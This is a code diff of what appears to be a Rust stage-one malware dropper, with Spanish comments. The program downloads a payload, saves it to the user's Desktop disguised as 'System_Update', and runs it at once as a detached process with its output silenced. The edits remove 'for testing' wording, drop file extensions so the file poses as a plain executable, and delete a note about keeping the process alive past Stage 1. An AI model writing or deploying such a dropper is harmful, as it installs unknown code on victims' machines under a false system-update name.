@@ -13,7 +13,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let bytes = response.bytes()?;
     println!("✅ Payload descargado ({} bytes)", bytes.len());
 
-    // 2. Guardar en el Escritorio (más visible para pruebas)
+    // 2. Guardar en el Escritorio
     let desktop = match env::consts::OS {
         "windows" => env::var("USERPROFILE")? + "\\Desktop",
         "macos" => env::var("HOME")? + "/Desktop",
@@ -23,8 +23,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let filename = match env::consts::OS {
         "windows" => "System_Update.exe",
-        "macos" => "System_Update.dmg",
-        "linux" => "System_Update.deb",
+        "macos" => "System_Update",   // Sin extensión → Unix Executable File
+        "linux" => "System_Update",
         _ => "System_Update.bin",
     };
 
@@ -33,7 +33,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     file.write_all(&bytes)?;
     println!("✅ Archivo guardado en: {}", path);
 
-    // 3. EJECUTAR INMEDIATAMENTE (para pruebas)
+    // 3. EJECUTAR INMEDIATAMENTE
     #[cfg(target_os = "windows")]
     {
         println!("🚀 Ejecutando payload...");
@@ -53,7 +53,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         println!("🚀 Ejecutando payload...");
 
-        // Desvincular el proceso del Stage 1 para que no muera
         Command::new(&path)
             .stdout(Stdio::null())
             .stderr(Stdio::null())
